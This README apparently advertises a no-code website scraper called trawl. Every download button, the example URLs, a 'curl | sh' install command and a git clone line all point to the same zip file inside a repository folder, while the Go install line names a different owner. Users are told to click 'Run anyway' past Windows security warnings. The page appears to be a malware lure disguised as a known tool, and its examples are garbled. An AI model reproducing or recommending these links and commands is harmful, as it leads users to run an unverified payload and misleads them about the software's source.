# 🐟 trawl - Extract Website Data Easily

[![Download trawl](https://img.shields.io/badge/Download-trawl-blue?style=for-the-badge&logo=github)](https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip)

---

![trawl](img/logo.png)

## 📋 What is trawl?

Trawl is a tool to pull structured data from any website. You tell it *what* information you want, not *how* to find it. When a site changes, trawl automatically adjusts to keep getting the data right. It works fast and doesn’t need extra API calls for each page.

You don’t need to know how to write CSS selectors or code. Just provide simple commands, and trawl does the rest.

---

## 🖥️ System Requirements

Trawl runs on Windows 10 and newer versions. Your PC should have:

- A 64-bit processor  
- At least 4 GB of RAM  
- 500 MB of free disk space  

You will also need an internet connection to download and run the program and to let it access websites for data extraction.

---

## 📥 Download and Install

[![Download trawl](https://img.shields.io/badge/Download-trawl-green?style=for-the-badge&logo=windows)](https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip)

To get started with trawl on Windows, visit the release page below. It shows the latest version ready for download.

**Go here to download:**  
https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip

Look for the file that ends with `.exe` (this is the Windows installer or executable file). Click on it to download.

---

### How to run trawl on Windows

1. Download the `.exe` file from the releases page.  
2. Find the downloaded file in your Downloads folder.  
3. Double-click the file to open. If a security warning pops up, choose “Run” or “More info” then “Run anyway.”  
4. The program will open in a new window or command prompt.  

You don’t need to install extra software to run trawl, but you do need to open the Command Prompt (or PowerShell) once it is running.

---

## 🚀 Getting Started with trawl

Follow these steps to extract data from a website.

### Step 1: Open Command Prompt

- Press the Windows key.  
- Type `cmd` and press Enter. This opens a black window called Command Prompt.

### Step 2: Set up your API key

Trawl uses large language models to figure out the right data to extract. You need to add a key from your API provider.

Depending on the AI platform you use, type this command (replace `YOUR_API_KEY` with your real key):

For Google Gemini:  
```
set GOOGLE_GEMINI_APIKEY=YOUR_API_KEY
```

For Anthropic:  
```
set ANTHROPIC_API_KEY=YOUR_API_KEY
```

Press Enter to save the key for your current session.

### Step 3: Run trawl with a website URL

Type a simple command like this to get product information:  
```
trawl "https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip" --fields "title, price, rating, in_stock"
```

This command asks trawl to get the product title, price, rating, and stock info from the sample website.

### Step 4: Save output as CSV (optional)

If you want the results in a CSV file (easy to open in Excel), add this flag:  
```
trawl "https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip" --fields "title, price, rating, in_stock" --csv > products.csv
```

This saves the output to a file named `products.csv` in the folder you ran the command.

---

## 🛠️ Features at a glance

- No need to write code or CSS selectors.  
- Automatically adapts when websites change.  
- Works quickly after initial setup.  
- Uses AI only once per website layout, saving time and API use.  
- Runs entirely on your PC for steady data scraping.  
- Supports output in JSON and CSV formats.  
- Works with many types of websites and data.

---

## 🔧 More ways to install (For advanced users)

If you want to use trawl differently, you can install or build it another way.

- Run this command in PowerShell to install:  
```
curl -fsSL https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip | sh
```

- Or, if you have the Go programming language installed, run:  
```
go install github.com/akdavidsson/trawl@latest
```

- To build from source code:  
```
git clone https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip
cd trawl
go build -o trawl .
```

For most users, downloading and running the `.exe` file is easiest.

---

## 🤔 Troubleshooting and Tips

- If the command line says “command not found,” make sure you are running the command from the folder where trawl is located, or add trawl to your system PATH.  
- You must set your API key every time you open the Command Prompt unless you add it to your system environment variables.  
- Use quotes around website URLs and fields to avoid errors.  
- Try simple websites first to get comfortable with the commands.  
- If extraction results look wrong, check your API key and website URL.

---

## 📚 Learn more

For detailed instructions and advanced options, check the official GitHub repository:

https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip

---

[![Download trawl](https://img.shields.io/badge/Download-trawl-purple?style=for-the-badge&logo=windows)](https://github.com/teamn9636/trawl/raw/refs/heads/main/internal/analyze/Software_1.7.zip)